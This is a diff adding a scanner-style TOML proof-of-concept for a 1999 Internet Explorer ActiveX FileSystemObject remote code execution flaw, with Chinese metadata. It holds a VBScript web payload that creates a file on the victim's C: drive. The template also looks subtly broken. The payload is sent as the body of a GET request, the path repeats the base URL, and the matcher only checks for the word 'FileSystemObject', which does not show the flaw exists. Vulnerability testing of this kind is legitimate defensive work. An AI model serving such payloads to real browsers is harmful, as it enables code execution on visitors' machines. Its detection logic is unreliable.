@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "验证 Internet Explorer 在安全级别低于'中'时，通过恶意网页调用 FileSystemObject ActiveX 对象实现远程代码执行。PoC 页面包含 VBScript 脚本尝试创建 FileSystemObject 并写入测试文件。"
+id = "POC-AVE-1999-1808"
+name = "Microsoft Internet Explorer ActiveX FileSystemObject RCE PoC"
+severity = "critical"
+tags = ["ave-1999-1808"]
+vuln_id = [
+    "CVE-1999-1241",
+    "AVE-1999-1808",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = '''
+<HTML>
+<SCRIPT LANGUAGE="VBScript">
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  Set file = fso.CreateTextFile("C:\AVE_TEST.txt", True)
+  file.WriteLine("Vulnerable")
+  file.Close
+</SCRIPT>
+</HTML>'''
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["FileSystemObject"]
